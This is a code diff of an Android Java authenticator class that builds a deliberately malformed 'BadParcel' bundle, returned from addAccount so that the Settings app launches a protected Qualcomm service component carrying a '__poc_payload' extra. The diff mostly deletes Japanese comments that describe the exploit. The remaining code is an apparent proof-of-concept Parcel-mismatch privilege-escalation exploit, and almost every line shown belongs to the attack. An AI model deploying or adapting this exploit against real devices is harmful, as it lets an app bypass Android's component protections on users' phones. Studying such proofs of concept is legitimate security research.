@@ -28,26 +28,15 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
             throws NetworkErrorException {
 
         Log.d(TAG, "addAccount called");
-
-        // ここで BadParcel を構築し、Settings に戻す Bundle に含める
         Bundle resultBundle = new Bundle();
-
-        // ターゲット: DpmServiceApp を起動する Intent (Service だが、Activity として扱う)
         Intent evilIntent = new Intent();
         evilIntent.setComponent(new ComponentName("com.qti.dpmserviceapp",
                 "com.qti.dpmserviceapp.DpmServiceApp"));
         evilIntent.putExtra("__poc_payload", "trigger");
-
-        // 通常は KEY_INTENT に設定すると Settings が startActivity する
         resultBundle.putParcelable(AccountManager.KEY_INTENT, evilIntent);
-
-        // しかし、より強力な BadParcel を構築するために、手動で Parcel を操作する
-        // (以下は元の MyAuthenticator のコードを完全に再現)
         Parcel obtain = Parcel.obtain();
         Parcel obtain2 = Parcel.obtain();
         Parcel obtain3 = Parcel.obtain();
-
-        // --- 元のコードの完全な複製 (バイト列生成) ---
         obtain2.writeInt(3);
         obtain2.writeInt(13);
         obtain2.writeInt(2);
@@ -88,7 +77,6 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         obtain2.writeString("intent");
         obtain2.writeInt(4);
         obtain2.writeString("android.content.Intent");
-        // ここで intent を Parcel に書き込む (obtain3 に書き込んで append)
         evilIntent.writeToParcel(obtain3, 0);
         obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
         int dataPosition2 = obtain2.dataPosition();
@@ -99,18 +87,12 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         Log.d(TAG, "BadParcel length is " + Integer.toHexString(dataSize));
 
         obtain.writeInt(dataSize);
-        obtain.writeInt(0x4c444e42); // 'L' 'D' 'N' 'B' マジック
+        obtain.writeInt(0x4c444e42);
         obtain.appendFrom(obtain2, 0, dataSize);
         obtain.setDataPosition(0);
-
-        // Bundle に読み込む
         Bundle badBundle = new Bundle();
         badBundle.readFromParcel(obtain);
-
-        // 元の resultBundle にマージ (実際には badBundle をそのまま返しても良い)
         resultBundle.putAll(badBundle);
-
-        // 後片付け
         obtain.recycle();
         obtain2.recycle();
         obtain3.recycle();
